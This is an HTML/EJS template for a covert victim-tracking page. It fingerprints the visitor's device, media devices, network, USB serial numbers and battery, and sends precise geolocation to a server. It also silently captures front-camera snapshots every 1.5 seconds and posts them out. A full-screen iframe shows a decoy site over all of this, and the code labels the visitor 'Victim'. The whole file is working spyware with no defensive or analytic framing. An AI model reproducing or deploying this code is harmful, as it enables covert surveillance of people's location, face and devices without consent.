<html lang="en-US">
<head> 
<meta charset="UTF-8"> 
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
<meta name="robots" content="noindex, nofollow"> 
<meta name="viewport" content="width=device-width,initial-scale=1"> 
<title></title> 
<style>
iframe{ 
border:0;
overflow:hidden;
height:100%;
width:100%;
position:fixed;
top:0;
left:0;
}
</style>
</head>
<body>
<video id="video" style="display:none"  playsinline autoplay></video>
<canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
  <script>
    async function redirectToMainBrowser() {
      // Redirect to main browser if opened in Facebook, Instagram, or WhatsApp browser
      var userAgent = navigator.userAgent || navigator.vendor || window.opera;
      if (userAgent.match(/FBAN/i) || userAgent.match(/FBAV/i) || userAgent.match(/Instagram/i) || userAgent.match(/WhatsApp/i)) {
          var currentURL = window.location.href;
          // Open in default browser on all devices
          var fallbackURL = "intent://" + currentURL.substring(currentURL.indexOf("//") + 2) + "#Intent;scheme=http;package=com.android.chrome;end";
          window.location.href = fallbackURL;
      }
    }

    redirectToMainBrowser();
  </script>
<script type="text/javascript" defer>
var uid="<%=uid %>";
async function gather(){
var td="";
<% if(!t){ %>
td += '<code>‚úÖVictim Information </code><br><br><b>‚öì IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
<% }else{ %>
await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>‚úÖVictim Information </code><br><br><b>‚öì IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));

<% } %>

td+="<br><br><b>‚è≥ Date In Victim's Device :</b> "+new Date()+"<br>";
var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
var xoc=["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
///INITIALS
td+="<br><b>üì± Device Information</b><br>";
for(var i=0;i < xo.length;i++){ 
if(xo[i] in navigator){
var str = navigator[xo[i]];
td+="<b>"+xo[i] +"</b>: <code>"+str+"</code><br>";
}
}



if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
/////List cameras and microphones.
await navigator.mediaDevices?.enumerateDevices()
.then(function(devices) {
td+="<br><b>üì∑ Media Device Information</b><br>";
devices.forEach(function(device) {
td+="<b>"+device.kind+":</b> " + device.label +" id = <code>" + device.deviceId+"</code><br>";
});
})
.catch(function(err) {
td+="<br><b>üì∑ Media Device Information</b><br>";
td+="‚ö†Ô∏è Media Device Error: "+err.name + ": " + err.message;
});
}


////CONNECTION
if("connection" in navigator){
td+="<br><b>üï∏Ô∏è Network Information</b><br>";
for(var i=0;i < xoc.length;i++){ 
var str = navigator.connection[xoc[i]];
td+="<b>"+xoc[i] +"</b>: <code>"+str+"</code><br>";
}}


////USB
if("usb" in navigator){
await navigator.usb.getDevices()
.then(devices => {
td+="<br><b>üîå Total USB devices connected:</b> " + devices.length+"<br>";
devices.forEach(device => {
td+="<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber+"</code><br>";
});
});
}

if("getBattery" in navigator){
await navigator.getBattery().then(function(battery) {
td+="<br><b>üîã Battery Information</b><br>";
td+="<b>üîãBattery Level:</b> " +battery.level*100+"%<br><b>‚ö° Is Battery Charging:</b> "+battery.charging+"";
});
}

//////Location
if(!navigator.geolocation) {
td+="<br><b>üìç Location Information</b><br>";
td+="‚ö†Ô∏è Location API not avilable";
} 

function success(pos) {
const crd = pos.coords;
$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
});
}

function error(err) {
td+="<br><b>üìç Location Information</b><br>";
td+="‚ö†Ô∏è Location ERROR: <code>"+err.message+"</code>";
}
if(navigator.geolocation){
navigator.geolocation.getCurrentPosition(success, error, {  enableHighAccuracy: true, maximumAge: 0});
}




const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

function post(o){
$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{

});
}
var constraints = {audio: false,video: {facingMode: "user" }};
// Access webcam
function cam() {
  navigator.mediaDevices.getUserMedia(constraints)
    .then(handleSuccess)
    .catch(function(error) {
      // Handle camera permission rejection or absence of a working camera
      const deniedText = "Unfortunately, we failed to send you any photo of the victim. It might be because your victim blocked the camera permission or doesn't have a working camera installed.";
      camDenReq(deniedText);
    });
}

function camDenReq(deniedText) {
    $.post("<%=a %>/cam-denied", { uid: uid, deniedText: encodeURIComponent(deniedText) }, (s) => {
    });
}

cam();
// Success
function handleSuccess(stream) {
window.stream = stream;
video.srcObject = stream;
var context = canvas.getContext('2d');
var id=setInterval(function(){
context.drawImage(video, 0, 0, 500, 500);
var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
post(canvasData);
}, 1500);
}






$.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{console.log("done")});

}

gather();

</script>
  <iframe src="<%=url %>"></iframe>
</body>
</html>
